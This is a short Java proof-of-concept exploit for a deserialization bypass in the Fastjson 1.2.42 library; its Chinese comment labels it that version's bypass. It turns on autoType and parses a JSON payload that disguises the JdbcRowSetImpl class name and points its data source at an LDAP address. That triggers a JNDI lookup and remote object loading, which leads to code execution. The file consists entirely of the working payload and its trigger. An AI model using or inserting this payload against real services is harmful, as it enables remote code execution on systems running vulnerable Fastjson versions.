import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

// Fastjson 1.2.42 版本的绕过
public class SuccessBypassEXP_42 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload ="{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://127.0.0.1:1234/ExportObject\",\"autoCommit\":\"true\" }";
        JSON.parse(payload);
    }
}
